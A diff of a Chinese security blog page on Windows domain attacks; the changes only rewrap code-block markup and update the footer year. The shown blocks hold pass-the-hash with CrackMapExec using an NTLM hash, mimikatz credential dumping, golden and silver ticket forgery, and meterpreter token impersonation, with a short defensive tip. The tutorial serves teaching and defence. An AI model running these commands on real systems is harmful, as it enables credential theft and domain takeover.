@@ -347,14 +347,14 @@ Smbmap</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
-SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
-<span class="o">[</span>*<span class="o">]</span> Windows <span class="m">7</span> Ultimate <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>name:LIYINGZHEA30B<span class="o">)</span>
-<span class="o">(</span>domain:PAYLOADS<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
-SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
-<span class="o">[</span>+<span class="o">]</span> PAYLOADS<span class="se">\a</span>dministrator dab7de8feeb5ecac65faf9fdc6cac3a9
-<span class="o">(</span>Pwn3d!<span class="o">)</span>SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B <span class="o">[</span>+<span class="o">]</span> Executed <span class="nb">command</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
+</span></span><span class="line"><span class="cl">SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Windows <span class="m">7</span> Ultimate <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>name:LIYINGZHEA30B<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>domain:PAYLOADS<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PAYLOADS<span class="se">\a</span>dministrator dab7de8feeb5ecac65faf9fdc6cac3a9
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Pwn3d!<span class="o">)</span>SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B <span class="o">[</span>+<span class="o">]</span> Executed <span class="nb">command</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="kerberos域认证">Kerberos域认证</h2>
 <h3 id="active-directory活动目录的概念">Active Directory(活动目录)的概念</h3>
@@ -470,8 +470,8 @@ SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">C:\files&gt;mimikatz.exe &#34;privilege::debug” &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34; &gt; log.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\files&gt;mimikatz.exe &#34;privilege::debug” &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34; &gt; log.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>伪造票据:</p>
 <div class="highlight"><div class="chroma">
@@ -479,8 +479,8 @@ SMB 192.168.3.5 <span class="m">445</span> LIYINGZHEA30B
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&#34; exit
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&#34; exit
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Other：</p>
 <ul>
@@ -582,8 +582,8 @@ PS:这里的krbtgt hash就是之前讲的KDC Hash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&#34; exit
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&#34; exit
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="tickets-总结">Tickets 总结</h3>
 <ul>
@@ -647,13 +647,13 @@ PS:这里的krbtgt hash就是之前讲的KDC Hash
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; getsystem
-meterpreter &gt; load incognito meterpreter &gt; list_tokens –u
-Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
-meterpreter &gt; impersonate_token &#34;PAYLOADS\\Administrator”
-[+] Delegation token available
-[+] Successfully impersonated user PAYLOADS\Administrator
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getsystem
+</span></span><span class="line"><span class="cl">meterpreter &gt; load incognito meterpreter &gt; list_tokens –u
+</span></span><span class="line"><span class="cl">Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
+</span></span><span class="line"><span class="cl">meterpreter &gt; impersonate_token &#34;PAYLOADS\\Administrator”
+</span></span><span class="line"><span class="cl">[+] Delegation token available
+</span></span><span class="line"><span class="cl">[+] Successfully impersonated user PAYLOADS\Administrator
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="windows-access-token令牌假冒防御">Windows Access Token令牌假冒防御</h3>
 <p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p>
@@ -694,7 +694,7 @@ meterpreter &gt; impersonate_token &#34;PAYLOADS\\Administrator”
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
